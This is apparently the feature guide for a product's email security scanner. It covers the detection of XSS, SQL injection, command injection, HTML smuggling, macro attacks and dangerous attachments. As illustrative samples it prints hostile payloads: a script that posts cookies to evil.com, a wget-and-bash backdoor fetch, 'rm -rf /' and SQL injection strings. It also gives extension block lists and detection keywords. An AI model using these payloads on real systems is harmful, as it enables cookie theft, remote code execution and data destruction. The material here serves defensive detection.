# Enhanced Email Protection - Web Attacks & Unsafe Attachments

## 🛡️ Overview

Nebula Shield's Email Protection now includes **advanced web attack blocking** and **comprehensive unsafe attachment detection** to protect against modern email-based threats.

---

## 🚨 Web Attack Protection

### What is Web Attack Protection?

Email-based web attacks attempt to inject malicious code into email content that can execute when the email is viewed or processed. Our system detects and blocks these attacks before they can cause harm.

### Protected Attack Types

#### 1. **Cross-Site Scripting (XSS)**
- **Risk**: Critical
- **Description**: Malicious JavaScript code embedded in emails
- **Detection Patterns**:
  - `<script>` tags with malicious code
  - `javascript:` protocol handlers
  - Event handlers (`onerror`, `onclick`, `onload`)
  - `<iframe>` injection attempts
- **Example**:
  ```html
  <script>alert('XSS Attack')</script>
  javascript:void(document.location='http://evil.com/steal')
  ```

#### 2. **SQL Injection**
- **Risk**: Critical
- **Description**: Attempts to manipulate database queries through email forms
- **Detection Patterns**:
  - SQL keywords (`UNION SELECT`, `INSERT INTO`, `DROP TABLE`)
  - Comment injection (`--`, `/*`)
  - Quote escaping attempts
- **Example**:
  ```sql
  Email: ' OR '1'='1' --
  Password: admin' UNION SELECT * FROM users --
  ```

#### 3. **Command Injection**
- **Risk**: Critical
- **Description**: Attempts to execute system commands
- **Detection Patterns**:
  - Shell operators (`|`, `;`, `&&`, `||`)
  - Command execution (`` `command` ``, `$(command)`)
  - Dangerous commands (`rm`, `wget`, `curl`, `bash`, `powershell`)
- **Example**:
  ```bash
  ; rm -rf /
  | wget http://malicious.com/backdoor.sh && bash backdoor.sh
  ```

#### 4. **HTML Smuggling**
- **Risk**: High
- **Description**: Obfuscation techniques to hide malicious content
- **Detection Patterns**:
  - Base64 encoding (`atob()`, `btoa()`)
  - Character encoding (`fromCharCode`, `\x`, `%`)
  - Unicode obfuscation
- **Example**:
  ```javascript
  atob('bWFsaWNpb3VzIGNvZGU=')
  String.fromCharCode(109,97,108,105,99,105,111,117,115)
  ```

#### 5. **Macro Injection**
- **Risk**: High
- **Description**: Attempts to trigger macro execution
- **Detection Patterns**:
  - Auto-execution keywords (`Auto_Open`, `Document_Open`)
  - Scripting objects (`WScript`, `ActiveXObject`)
  - Shell execution patterns
- **Example**:
  ```vba
  Auto_Open
  Shell("cmd.exe /c malicious.bat")
  ```

---

## 🔒 Unsafe Attachment Protection

### What is Unsafe Attachment Protection?

Email attachments are a common vector for malware delivery. Our system analyzes file types, names, and content to identify and block dangerous attachments before they can harm your system.

### Blocked File Categories

#### 1. **Executable Files** (Critical Risk)
```
.exe   - Windows executables
.scr   - Screen savers (often malware)
.bat   - Batch scripts
.cmd   - Command scripts
.com   - DOS executables
.pif   - Program Information File
.msi   - Windows Installer packages
.dll   - Dynamic Link Libraries
.sys   - System drivers
```

**Why Blocked**: These files can directly execute code on your system.

#### 2. **Script Files** (Critical Risk)
```
.vbs   - Visual Basic Script
.js    - JavaScript files
.jse   - Encoded JavaScript
.wsh   - Windows Script Host
.wsf   - Windows Script File
.ps1   - PowerShell scripts
.hta   - HTML Applications
.reg   - Registry files
```

**Why Blocked**: Scripts can automate malicious actions without user awareness.

#### 3. **Office Files with Macros** (High Risk)
```
.docm  - Word with macros
.xlsm  - Excel with macros
.pptm  - PowerPoint with macros
.dotm  - Word template with macros
.xltm  - Excel template with macros
.xlam  - Excel add-in with macros
```

**Why Blocked**: Macros can contain malicious code that executes when the document opens.

#### 4. **Mobile Malware** (High Risk)
```
.apk   - Android applications
.app   - macOS applications
.deb   - Debian packages
.rpm   - RedHat packages
.dmg   - macOS disk images
```

**Why Blocked**: Can install malware on mobile and desktop systems.

#### 5. **Archives** (Medium Risk)
```
.zip   - ZIP archives
.rar   - RAR archives
.7z    - 7-Zip archives
.tar   - TAR archives
.gz    - GZIP archives
.bz2   - BZIP2 archives
.iso   - Disk images
```

**Why Flagged**: Can hide malware or other dangerous files. Scanned for suspicious contents.

#### 6. **Other Suspicious Files**
```
.jar   - Java archives
.lnk   - Windows shortcuts
.scpt  - AppleScripts
.action - Automator actions
.workflow - Workflow files
.bin   - Binary files
.gadget - Windows gadgets
```

**Why Blocked**: Often used in sophisticated attacks.

---

## 🎯 Suspicious Filename Patterns

Our system detects dangerous filename patterns regardless of actual file type:

### Pattern Examples

1. **Invoice Scams**
   - `invoice.pdf.exe` ⚠️ Double extension
   - `invoice_2024.scr` ⚠️ Executable disguised as document
   - `payment_receipt.bat` ⚠️ Script disguised as receipt

2. **Document Impersonation**
   - `document.pdf.js` ⚠️ Script pretending to be PDF
   - `report.doc.exe` ⚠️ Executable pretending to be Word doc
   - `statement.xls.vbs` ⚠️ Script pretending to be Excel

3. **Cracking Tools**
   - `crack_keygen.zip` ⚠️ Piracy-related (often contains malware)
   - `software_activator.exe` ⚠️ Fake activation tools
   - `license_patch.bat` ⚠️ Malicious patchers

---

## 📊 Detection Statistics

Our Email Protection tracks and displays:

### Web Attack Statistics
- **Total Web Attacks Blocked**: Real-time counter
- **Attack Types Detected**: XSS, SQL Injection, Command Injection, etc.
- **Severity Levels**: Critical, High, Medium, Low
- **Attack Patterns**: Specific injection patterns found

### Attachment Statistics
- **Dangerous Attachments Blocked**: Total count
- **Critical Threats**: Executables, scripts
- **High-Risk Files**: Macro-enabled documents, mobile malware
- **Suspicious Archives**: Compressed files with malware indicators
- **Double Extensions**: Files with multiple extensions

---

## 🔍 How to Use

### 1. **Scan an Email**

Navigate to **Email Protection** → **Scan Email** tab:

1. Enter email details (From, Subject, Body)
2. Add attachment information if present
3. Click **"Scan Email for Threats"**

### 2. **View Results**

The scan will show:
- ✅ **Risk Score**: 0-100 scale (higher = more dangerous)
- ⚠️ **Detected Threats**: List of all threats found
- 🛡️ **Web Attacks**: Specific attack patterns detected
- 🔒 **Dangerous Attachments**: Blocked files with reasons
- 📋 **Recommendation**: Block, Review, or Allow

### 3. **Test with Samples**

Use the sample buttons to see protection in action:

- **Safe Sample**: Clean email (should pass)
- **Phishing Sample**: Typical phishing email
- **BEC Sample**: Business Email Compromise
- **Web Attack + Malware**: Email with XSS, SQL injection, command injection, and dangerous attachments

### 4. **Quarantine Management**

Navigate to **Quarantine** tab to:
- View all blocked emails
- Filter by threat type
- Search by sender or subject
- Export quarantine data
- Delete or mark emails as safe

---

## 📈 Real-World Examples

### Example 1: XSS Attack Email

**Subject**: "Your Account Security Alert"

**Body**:
```html
Please verify your account:
<script>
  fetch('http://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(document.cookie)
  });
</script>
```

**Detection**:
- ✅ XSS pattern detected in `<script>` tag
- ✅ Risk Score: 90/100 (Critical)
- ✅ Auto-quarantined

---

### Example 2: Malicious Attachment

**Attachment**: `invoice_Q4_2024.pdf.exe`

**Detection**:
- ✅ Double extension detected
- ✅ Executable file (.exe) blocked
- ✅ Suspicious filename pattern (invoice + .exe)
- ✅ Risk Score: 95/100 (Critical)
- ✅ File blocked before download

---

### Example 3: SQL Injection + Command Injection

**Body**:
```
Update your account:
Email: admin@company.com' OR '1'='1' --
Password: | rm -rf / && wget http://evil.com/backdoor
```

**Detection**:
- ✅ SQL Injection pattern (`' OR '1'='1' --`)
- ✅ Command Injection pattern (`| rm -rf /`)
- ✅ Multiple critical threats detected
- ✅ Risk Score: 100/100 (Critical)
- ✅ Auto-quarantined with high-priority alert

---

## 🎨 UI Features

### Protection Status Cards

Two prominent cards show:

1. **🛡️ Web Attack Protection** (Red Card)
   - Attacks blocked counter
   - List of protection types
   - Real-time statistics

2. **🔒 Unsafe Attachment Blocking** (Orange Card)
   - Dangerous files blocked counter
   - List of blocked file types
   - Detection statistics

### Statistics Dashboard

Displays comprehensive metrics:
- Total emails scanned
- Spam detected
- Phishing attempts blocked
- BEC attempts blocked
- Web attacks prevented
- Dangerous attachments blocked
- Emails quarantined

---

## 🔧 Technical Implementation

### Backend Service

**File**: `src/services/emailProtection.js`

**Key Components**:

1. **EMAIL_WEB_ATTACK_PATTERNS**: Regex patterns for attack detection
2. **DANGEROUS_ATTACHMENT_PATTERNS**: File extension blacklists
3. **detectWebAttacks()**: Analyzes email content for injection attacks
4. **checkAttachments()**: Validates attachment safety
5. **scanEmail()**: Orchestrates all security checks

### Frontend UI

**File**: `src/pages/EmailProtection.js`

**Features**:
- Material-UI components for modern interface
- Real-time scanning with progress indicators
- Detailed threat breakdowns
- Quarantine management system
- Export capabilities
- Sample email loader

---

## 🚀 Benefits

### For Organizations

✅ **Prevent Data Breaches**: Block code injection attacks before they execute
✅ **Stop Malware**: Prevent dangerous file downloads
✅ **Protect Employees**: Automated threat detection reduces human error
✅ **Compliance**: Detailed logs and quarantine for audit trails
✅ **Cost Savings**: Prevent costly security incidents

### For Users

✅ **Peace of Mind**: Comprehensive protection runs automatically
✅ **Easy to Use**: Clear visualizations and recommendations
✅ **Educational**: Learn about threats through detailed analysis
✅ **No Performance Impact**: Fast scanning with minimal overhead

---

## 📚 Related Documentation

- [Threat Signatures Guide](./VIRUS-DEFINITIONS-ENHANCED.md)
- [Web Protection Features](./WEB-PROTECTION-GUIDE.md)
- [Security Best Practices](./SECURITY-GUIDE.md)
- [API Documentation](./API-DOCUMENTATION.md)

---

## 🆘 Support

If you encounter false positives or have questions:

1. **Report Issue**: Use the quarantine "Mark as Safe" feature
2. **Add to Trusted**: Whitelist known safe senders
3. **Contact Support**: Email security@nebulashield.com
4. **Documentation**: Check FAQ and troubleshooting guides

---

## 📝 Version History

### v2.0 (Current)
- ✅ Added web attack detection (XSS, SQL Injection, Command Injection)
- ✅ Enhanced attachment scanning with 60+ dangerous file types
- ✅ Suspicious filename pattern detection
- ✅ UI improvements with prominent protection cards
- ✅ Sample email loader for testing
- ✅ Detailed threat statistics

### v1.0
- Initial release with basic spam/phishing detection

---

**Last Updated**: October 13, 2025
**Status**: ✅ Production Ready
**Security Level**: 🛡️ Enterprise Grade
